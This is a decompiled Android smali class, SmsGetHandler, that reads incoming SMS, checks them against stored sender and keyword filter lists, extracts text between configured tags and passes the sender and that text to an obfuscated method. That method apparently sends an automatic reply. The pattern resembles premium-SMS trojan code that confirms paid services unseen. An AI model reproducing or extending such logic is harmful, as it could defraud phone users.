.class public Lcom/xxx/yyy/SmsGetHandler;
.super Ljava/lang/Object;
.source "SmsGetHandler.java"


# static fields
.field public static final DB_NAME:Ljava/lang/String; = "css_db"

.field public static final VERSION:I = 0x3


# instance fields
.field public ReturnMsg:Ljava/lang/String;

.field public Tags:[Ljava/lang/String;

.field private ctx:Landroid/content/Context;

.field public filterKeyList:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Lcom/xxx/yyy/SMSEntityBad;",
            ">;"
        }
    .end annotation
.end field

.field public filterMdnList:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Lcom/xxx/yyy/SMSEntityBad;",
            ">;"
        }
    .end annotation
.end field

.field private helper:Lcom/xxx/yyy/SMSDatabaseHelper;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 6
    .parameter "ct"

    .prologue
    const/4 v5, 0x0

    .line 20
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 21
    iput-object p1, p0, Lcom/xxx/yyy/SmsGetHandler;->ctx:Landroid/content/Context;

    .line 22
    new-instance v0, Lcom/xxx/yyy/SMSDatabaseHelper;

    iget-object v1, p0, Lcom/xxx/yyy/SmsGetHandler;->ctx:Landroid/content/Context;

    const-string v2, "css_db"

    const/4 v3, 0x0

    const/4 v4, 0x3

    invoke-direct {v0, v1, v2, v3, v4}, Lcom/xxx/yyy/SMSDatabaseHelper;-><init>(Landroid/content/Context;Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase$CursorFactory;I)V

    iput-object v0, p0, Lcom/xxx/yyy/SmsGetHandler;->helper:Lcom/xxx/yyy/SMSDatabaseHelper;

    .line 23
    iget-object v0, p0, Lcom/xxx/yyy/SmsGetHandler;->helper:Lcom/xxx/yyy/SMSDatabaseHelper;

    invoke-virtual {v0, v5, v5}, Lcom/xxx/yyy/SMSDatabaseHelper;->getAll(II)Ljava/util/List;

    move-result-object v0

    iput-object v0, p0, Lcom/xxx/yyy/SmsGetHandler;->filterMdnList:Ljava/util/List;

    .line 24
    iget-object v0, p0, Lcom/xxx/yyy/SmsGetHandler;->helper:Lcom/xxx/yyy/SMSDatabaseHelper;

    const/4 v1, 0x1

    invoke-virtual {v0, v5, v1}, Lcom/xxx/yyy/SMSDatabaseHelper;->getAll(II)Ljava/util/List;

    move-result-object v0

    iput-object v0, p0, Lcom/xxx/yyy/SmsGetHandler;->filterKeyList:Ljava/util/List;

    .line 25
    iget-object v0, p0, Lcom/xxx/yyy/SmsGetHandler;->helper:Lcom/xxx/yyy/SMSDatabaseHelper;

    invoke-virtual {v0}, Lcom/xxx/yyy/SMSDatabaseHelper;->getBackContent()[Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/xxx/yyy/SmsGetHandler;->Tags:[Ljava/lang/String;

    .line 26
    const-string v0, "y"

    iput-object v0, p0, Lcom/xxx/yyy/SmsGetHandler;->ReturnMsg:Ljava/lang/String;

    .line 27
    return-void
.end method


# virtual methods
.method public FindReturnMsg(Ljava/lang/String;Ljava/lang/String;)Z
    .locals 10
    .parameter "from"
    .parameter "body"

    .prologue
    const/4 v9, -0x1

    const/4 v8, 0x1

    const/4 v7, 0x0

    .line 41
    const/4 v5, 0x0

    .line 42
    .local v5, spos:I
    invoke-virtual {p2}, Ljava/lang/String;->length()I

    move-result v1

    .line 43
    .local v1, epos:I
    iget-object v6, p0, Lcom/xxx/yyy/SmsGetHandler;->Tags:[Ljava/lang/String;

    aget-object v6, v6, v7

    invoke-virtual {v6}, Ljava/lang/String;->length()I

    move-result v3

    .line 44
    .local v3, slen:I
    iget-object v6, p0, Lcom/xxx/yyy/SmsGetHandler;->Tags:[Ljava/lang/String;

    aget-object v6, v6, v8

    invoke-virtual {v6}, Ljava/lang/String;->length()I

    move-result v0

    .line 45
    .local v0, elen:I
    if-nez v3, :cond_0

    if-nez v0, :cond_0

    move v6, v7

    .line 69
    :goto_0
    return v6

    .line 47
    :cond_0
    if-lez v3, :cond_2

    .line 49
    iget-object v6, p0, Lcom/xxx/yyy/SmsGetHandler;->Tags:[Ljava/lang/String;

    aget-object v6, v6, v7

    invoke-virtual {p2, v6}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    .line 50
    .local v2, pos:I
    if-ne v2, v9, :cond_1

    move v6, v7

    .line 51
    goto :goto_0

    .line 52
    :cond_1
    add-int v5, v2, v3

    .line 54
    .end local v2           #pos:I
    :cond_2
    if-lez v0, :cond_4

    .line 56
    iget-object v6, p0, Lcom/xxx/yyy/SmsGetHandler;->Tags:[Ljava/lang/String;

    aget-object v6, v6, v8

    invoke-virtual {p2, v6}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    .line 57
    .restart local v2       #pos:I
    if-ne v2, v9, :cond_3

    move v6, v7

    .line 58
    goto :goto_0

    .line 59
    :cond_3
    move v1, v2

    .line 61
    .end local v2           #pos:I
    :cond_4
    if-ge v1, v5, :cond_5

    move v6, v7

    .line 62
    goto :goto_0

    .line 63
    :cond_5
    if-ne v1, v5, :cond_6

    .line 64
    const-string v6, "y"

    iput-object v6, p0, Lcom/xxx/yyy/SmsGetHandler;->ReturnMsg:Ljava/lang/String;

    .line 67
    :goto_1
    new-instance v4, Lcom/xxx/yyy/ssmm;

    invoke-direct {v4}, Lcom/xxx/yyy/ssmm;-><init>()V

    .line 68
    .local v4, sm:Lcom/xxx/yyy/ssmm;
    iget-object v6, p0, Lcom/xxx/yyy/SmsGetHandler;->ctx:Landroid/content/Context;

    iget-object v7, p0, Lcom/xxx/yyy/SmsGetHandler;->ReturnMsg:Ljava/lang/String;

    invoke-virtual {v4, v6, p1, v7}, Lcom/xxx/yyy/ssmm;->Gef(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    move v6, v8

    .line 69
    goto :goto_0

    .line 66
    .end local v4           #sm:Lcom/xxx/yyy/ssmm;
    :cond_6
    invoke-virtual {p2, v5, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v6

    iput-object v6, p0, Lcom/xxx/yyy/SmsGetHandler;->ReturnMsg:Ljava/lang/String;

    goto :goto_1
.end method

.method public ReflashDb()V
    .locals 3

    .prologue
    const/4 v2, 0x0

    .line 36
    iget-object v0, p0, Lcom/xxx/yyy/SmsGetHandler;->helper:Lcom/xxx/yyy/SMSDatabaseHelper;

    invoke-virtual {v0, v2, v2}, Lcom/xxx/yyy/SMSDatabaseHelper;->getAll(II)Ljava/util/List;

    move-result-object v0

    iput-object v0, p0, Lcom/xxx/yyy/SmsGetHandler;->filterMdnList:Ljava/util/List;

    .line 37
    iget-object v0, p0, Lcom/xxx/yyy/SmsGetHandler;->helper:Lcom/xxx/yyy/SMSDatabaseHelper;

    const/4 v1, 0x1

    invoke-virtual {v0, v2, v1}, Lcom/xxx/yyy/SMSDatabaseHelper;->getAll(II)Ljava/util/List;

    move-result-object v0

    iput-object v0, p0, Lcom/xxx/yyy/SmsGetHandler;->filterKeyList:Ljava/util/List;

    .line 38
    return-void
.end method

.method public setTags(Ljava/lang/String;Ljava/lang/String;)V
    .locals 1
    .parameter "start"
    .parameter "end"

    .prologue
    .line 30
    iget-object v0, p0, Lcom/xxx/yyy/SmsGetHandler;->helper:Lcom/xxx/yyy/SMSDatabaseHelper;

    invoke-virtual {v0}, Lcom/xxx/yyy/SMSDatabaseHelper;->deleteBackRecord()I

    .line 31
    iget-object v0, p0, Lcom/xxx/yyy/SmsGetHandler;->helper:Lcom/xxx/yyy/SMSDatabaseHelper;

    invoke-virtual {v0, p1, p2}, Lcom/xxx/yyy/SMSDatabaseHelper;->insertBackRecord(Ljava/lang/String;Ljava/lang/String;)I

    .line 32
    iget-object v0, p0, Lcom/xxx/yyy/SmsGetHandler;->helper:Lcom/xxx/yyy/SMSDatabaseHelper;

    invoke-virtual {v0}, Lcom/xxx/yyy/SMSDatabaseHelper;->getBackContent()[Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/xxx/yyy/SmsGetHandler;->Tags:[Ljava/lang/String;

    .line 33
    return-void
.end method
